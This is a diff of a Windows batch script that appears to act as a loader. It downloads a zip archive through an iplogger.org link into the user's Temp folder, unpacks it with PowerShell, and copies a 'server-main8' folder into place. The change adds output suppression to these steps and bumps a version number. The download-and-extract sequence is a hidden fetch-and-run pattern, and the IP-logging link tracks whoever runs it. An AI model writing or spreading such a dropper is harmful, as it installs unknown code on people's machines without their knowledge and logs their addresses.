@@ -81,11 +81,11 @@ goto download1
 :download1
 powershell -c "Invoke-WebRequest -Uri 'https://iplogger.org/2aFdM5' -OutFile C:\Users\%username%\AppData\Local\Temp\main8.zip
 
-powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main8.zip'); $target.CopyHere($zip.Items(), 16); }"
+powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main8.zip'); $target.CopyHere($zip.Items(), 16); }" >nul
 
-powershell -command "Expand-Archive main8.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
+powershell -command "Expand-Archive main8.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp" >nul
 
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\server-main8" "C:\Users\%username%\AppData\Local\Temp"
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\server-main8" "C:\Users\%username%\AppData\Local\Temp" >nul
 
 cd C:\Users\%username%\AppData\Local\Temp
 
@@ -122,7 +122,7 @@ exit
 echo.
 echo  [+] Checking Updates
 cd C:\Users\%username%\AppData\Local\Temp
-set local=66.0
+set local=67.0
 set new1=
 set new2=
 set new3=
